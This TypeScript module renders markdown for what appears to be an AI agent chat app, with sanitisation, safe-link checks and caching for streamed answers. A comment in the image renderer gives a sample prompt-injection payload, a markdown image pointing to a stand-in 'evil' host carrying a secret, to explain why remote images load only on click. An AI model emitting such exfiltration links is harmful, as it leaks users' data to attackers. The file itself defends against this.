import { Marked } from "marked";
import createDOMPurify, { type DOMPurify } from "dompurify";
import { getLang, t } from "./i18n";
import { remoteImageHost } from "./remote-image";
import { cleanWorkdirPath, filePathOf, isImagePath, isLocalFilePath, isWorkdirPath, mediaKindOf } from "./files";
import { groupPictures } from "./gallery";
import { BARE_URL_END, MARKED_OPTIONS, NO_INDENTED_CODE, blocksOf, hideFenceTail, hideMarkerTail, streamSplit } from "./markdown-split";
import { highlightCode } from "./code-highlight";

const md = new Marked(MARKED_OPTIONS, NO_INDENTED_CODE, BARE_URL_END);

/** Off while the block being streamed is drawn: it is parsed again every frame, so it gets its colours once it is done. */
let colourCode = true;
/** Set when a code block was drawn plain because its grammar is still loading: that HTML must not be cached. */
let waited = false;

const escapeHtml = (s: string) =>
	s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

/** External schemes a rendered message may open: web pages and mail, matching the `open-url` extension policy. */
export function isSafeExternalUrl(href: string): boolean {
	try {
		const { protocol } = new URL(href);
		return protocol === "http:" || protocol === "https:" || protocol === "mailto:";
	} catch {
		return false;
	}
}

/** A picture on the server: Markdown.svelte fetches it with the token and swaps this placeholder for the image. */
function wdImage(href: string, text: string): string {
	const alt = escapeHtml(text || "");
	const path = filePathOf(href);
	return `<span class="wd-img" data-wd-src="${escapeHtml(path)}" data-alt="${alt}">${alt || escapeHtml(path)}</span>`;
}

/** A video/audio file on the server: Markdown.svelte fetches it with the token and swaps this placeholder for a player. */
function wdMedia(href: string, text: string, kind: string): string {
	const label = escapeHtml(text || filePathOf(href));
	return `<span class="wd-media" data-wd-src="${escapeHtml(filePathOf(href))}" data-kind="${kind}">${label}</span>`;
}

md.use({
	renderer: {
		// Code blocks get a header with a copy button; MarkdownView wires up the click via delegation.
		code({ text, lang }) {
			const label = (lang ?? "").split(/\s/)[0] ?? "";
			// Colours come from highlight.js (escaped text in `hljs-*` spans, sanitized below like the rest); copy reads
			// textContent, which is the code as written. A grammar still loading draws plain and marks the block to redo.
			const hl = colourCode ? highlightCode(text, label) : null;
			if (hl === "wait") waited = true;
			const body = hl === null || hl === "wait" ? escapeHtml(text) : hl;
			return (
				`<div class="codeblock"><div class="codehead"><span>${escapeHtml(label || "text")}</span>` +
				`<button type="button" class="copy" data-copy aria-label="${escapeHtml(t("코드 복사"))}">${escapeHtml(t("복사"))}</button></div>` +
				`<pre><code${hl === "wait" ? " data-hl-wait" : ""}>${body}</code></pre></div>`
			);
		},
		link({ href, title, text, tokens }) {
			const inner = this.parser.parseInline(tokens);
			const t = title ? ` title="${escapeHtml(title)}"` : "";
			// A link to a picture on the server is the picture: shown inline (and enlarged on click) like `![](...)`.
			if ((isWorkdirPath(href) || isLocalFilePath(href)) && isImagePath(href)) return wdImage(href, text);
			const kind = isWorkdirPath(href) || isLocalFilePath(href) ? mediaKindOf(href) : null;
			if (kind) return wdMedia(href, text, kind);
			// A relative link is a file in the session's working directory (the agent wrote it): preview it in the app.
			if (isWorkdirPath(href)) return `<a href="#" class="wd-file"${t} data-file="${escapeHtml(cleanWorkdirPath(href))}">${inner}</a>`;
			if (!isSafeExternalUrl(href)) return inner;
			return `<a href="${escapeHtml(href)}"${t} data-ext rel="noopener noreferrer">${inner}</a>`;
		},
		// A remote image is fetched the moment it is in the DOM, so a prompt-injected `![](https://evil/?d=<secret>)`
		// would leak data without any click. Images therefore render as a button; the image loads only when the
		// user presses it (see Markdown.svelte). Raw HTML <img> is dropped by the sanitizer below.
		image({ href, text }) {
			const alt = escapeHtml(text || "");
			// Our own server's file, not a third party: Markdown.svelte fetches it with the token and shows it inline.
			if (isWorkdirPath(href) || isLocalFilePath(href)) {
				const kind = mediaKindOf(href);
				return kind ? wdMedia(href, text, kind) : wdImage(href, text);
			}
			const host = remoteImageHost(href);
			if (!host) return alt;
			return (
				`<button type="button" class="remote-img" data-img-src="${escapeHtml(href)}" data-alt="${alt}">` +
				`${escapeHtml(t("원격 이미지 불러오기 ({host})", { host }))}</button>`
			);
		},
		table({ header, rows }) {
			const head = header.map((c) => `<th>${this.parser.parseInline(c.tokens)}</th>`).join("");
			const body = rows.map((r) => `<tr>${r.map((c) => `<td>${this.parser.parseInline(c.tokens)}</td>`).join("")}</tr>`).join("");
			return `<div class="tablewrap"><table><thead><tr>${head}</tr></thead><tbody>${body}</tbody></table></div>`;
		},
	},
});

const SAFE_URI_REGEXP = /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i;

let cachedWindow: unknown;
let cachedPurifier: DOMPurify | undefined;

function purifier(): DOMPurify {
	if (!cachedPurifier || cachedWindow !== globalThis.window) {
		cachedWindow = globalThis.window;
		cachedPurifier = createDOMPurify(globalThis.window as unknown as Parameters<typeof createDOMPurify>[0]);
		cachedPurifier.addHook("afterSanitizeAttributes", (node) => {
			if (node.tagName?.toUpperCase() === "A") {
				if (!node.hasAttribute("data-file")) {
					const href = node.getAttribute("href") ?? "";
					if (!isSafeExternalUrl(href)) {
						node.removeAttribute("href");
						node.removeAttribute("data-ext");
						return;
					}
					node.setAttribute("data-ext", "");
				}
				node.setAttribute("rel", "noopener noreferrer");
			}
		});
	}
	return cachedPurifier;
}

const cache = new Map<string, string>();

/** True when `html` holds a code block drawn plain while its grammar loads (see `onHighlightReady`). */
export const awaitsHighlight = (html: string): boolean => html.includes("data-hl-wait");

/** How many times the parser ran (a test reads it to check that streaming renders each settled block once). */
export const parseRuns = { n: 0 };

export function renderMarkdown(src: string, opts: { cache?: boolean } = {}): string {
	// The code-block header is translated, so the cache is per language (and reading it re-renders on a switch).
	const key = `${getLang()}\u0000${src}`;
	const hit = cache.get(key);
	if (hit !== undefined) return hit;
	// Streaming produces a new prefix every frame; caching those would evict the finished messages the cache is for.
	const store = opts.cache ?? true;
	waited = false;
	parseRuns.n++;
	const html = groupPictures(purifier().sanitize(md.parse(src, { async: false }) as string, {
		ALLOWED_URI_REGEXP: SAFE_URI_REGEXP,
		ADD_ATTR: ["data-copy", "data-ext", "data-img-src", "data-alt", "data-file", "data-wd-src", "data-kind", "data-hl-wait"],
		FORBID_TAGS: ["style", "form", "input", "iframe", "object", "embed", "img", "picture", "source", "video", "audio", "link", "meta"],
	}));
	// Finished messages are re-rendered on every sidebar toggle; keep a small cache for them. Not while a grammar loads:
	// the same text is drawn again in colour once it is there.
	if (store && !waited && src.length < 20_000) {
		if (cache.size > 300) cache.delete(cache.keys().next().value!);
		cache.set(key, html);
	}
	return html;
}

/** Settled blocks of answers being streamed, kept apart so they never push finished messages out of `cache`. */
const blockCache = new Map<string, string>();

/**
 * A streaming answer as HTML. Every block above the one being written is rendered on its own and cached (top-level
 * blocks render independently, so the pieces join into the same HTML as a full parse); only the tail is parsed again.
 */
export function renderStreaming(full: string): string {
	const src = hideMarkerTail(hideFenceTail(full));
	const cut = streamSplit(src);
	if (!cut) return renderTail(src);
	return renderHead(src.slice(0, cut)) + renderTail(src.slice(cut));
}

/** A settled head drawn in a recent frame, block by block. */
type Head = { lang: string; src: string; html: string; blocks: { raw: string; html: string }[] };
/** The heads of the last few frames, newest first: one per answer streaming at the same time (split panes). */
const recentHeads: Head[] = [];
const RECENT_HEADS = 4;

/**
 * The settled part of a streaming answer. It changes only when a new block starts; then the blocks it shares with a recent
 * frame's head are taken from that head, so a long answer renders only its new blocks. (`blockCache` alone could not do
 * this: once an answer has more blocks than the cache holds, each new block evicted the first, every lookup missed in
 * turn, and the whole answer was rendered again: 150-290ms frames past about 400 blocks.)
 */
function renderHead(src: string): string {
	const lang = getLang();
	let near: Head | undefined;
	for (const h of recentHeads) {
		if (h.lang !== lang) continue;
		if (h.src === src) return h.html;
		if (src.startsWith(h.src) && (!near || h.src.length > near.src.length)) near = h;
	}
	const blocks: Head["blocks"] = [];
	let head = "";
	let done = true;
	blocksOf(src).forEach((raw, i) => {
		const same = near?.blocks[i];
		let html = same?.raw === raw ? same.html : blockCache.get(`${lang}\u0000${raw}`);
		if (html === undefined) {
			html = renderMarkdown(raw, { cache: false });
			if (!awaitsHighlight(html)) {
				if (blockCache.size > 400) blockCache.delete(blockCache.keys().next().value!);
				blockCache.set(`${lang}\u0000${raw}`, html);
			} else done = false;
		}
		blocks.push({ raw, html });
		head += html;
	});
	// a block still waiting for its grammar is drawn again in colour once it is there, so a head holding one is not kept
	if (done) {
		const i = recentHeads.indexOf(near!);
		if (i >= 0) recentHeads.splice(i, 1); // the head this one grew from is not needed again
		recentHeads.unshift({ lang, src, html: head, blocks });
		recentHeads.length = Math.min(recentHeads.length, RECENT_HEADS);
	}
	return head;
}

/** The block still being written: plain code, so a growing code block costs no highlighting pass per frame. */
function renderTail(src: string): string {
	colourCode = false;
	try {
		return renderMarkdown(src, { cache: false });
	} finally {
		colourCode = true;
	}
}

/**
 * Run the markdown path once on a throwaway sample while the app is idle. The first real answer otherwise pays for the
 * parser's and the sanitizer's first run (regex compilation, hook setup, cold code) inside the frames of the send itself,
 * about 120ms at the moment the first token lands. The sample covers what answers are made of: emphasis, a list, a code
 * block, a table and a link. Nothing it produces is kept (no cache entry, nothing in the document).
 */
export function warmMarkdown() {
	const sample = "**warm** `up`\n\n- one\n- two\n\n```ts\nconst a = 1;\n```\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n[link](https://example.com)";
	renderStreaming(sample);
	renderStreaming(`${sample}\n\nmore text still being wr`);
	renderMarkdown(sample, { cache: false });
}
